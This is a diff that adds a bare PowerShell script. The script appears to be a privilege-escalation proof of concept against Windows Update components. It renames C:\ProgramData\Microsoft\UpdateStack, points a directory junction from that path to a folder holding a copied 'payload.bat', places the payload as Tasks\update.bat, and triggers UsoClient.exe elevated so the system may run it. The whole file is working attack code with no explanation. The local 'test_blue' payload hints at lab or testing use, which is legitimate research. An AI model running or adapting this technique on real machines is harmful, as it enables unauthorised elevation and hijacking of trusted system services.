@@ -1,0 +1,22 @@
+
+$payloadDir = "$env:USERPROFILE\Documents\Payload"
+New-Item -ItemType Directory -Force -Path $payloadDir
+
+
+Copy-Item "C:\Users\Administrator\Documents\test_blue.bat" "$payloadDir\payload.bat"
+
+
+$targetPath = "C:\ProgramData\Microsoft\UpdateStack"
+
+
+if (Test-Path $targetPath) {
+    Rename-Item $targetPath "$targetPath.bak" -Force
+}
+
+
+cmd.exe /c "mklink /J `"$targetPath`" `"$payloadDir`""
+
+New-Item -ItemType Directory -Force -Path "$payloadDir\Tasks"
+Copy-Item "$payloadDir\payload.bat" "$payloadDir\Tasks\update.bat"
+
+Start-Process "UsoClient.exe" -ArgumentList "StartScan" -Verb RunAs
